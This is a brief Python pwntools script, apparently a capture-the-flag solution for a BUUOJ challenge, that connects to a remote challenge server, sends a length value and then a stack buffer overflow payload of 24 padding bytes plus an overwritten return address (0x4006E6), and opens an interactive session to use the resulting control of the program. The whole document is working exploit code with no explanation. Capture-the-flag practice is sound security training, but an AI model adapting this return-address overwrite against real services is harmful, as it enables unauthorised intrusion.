from pwn import *

r = remote('node5.buuoj.cn',29701)

r.sendline('50')
payload = b'a'*24 + p64(0x4006E6)
r.sendline(payload)
r.interactive()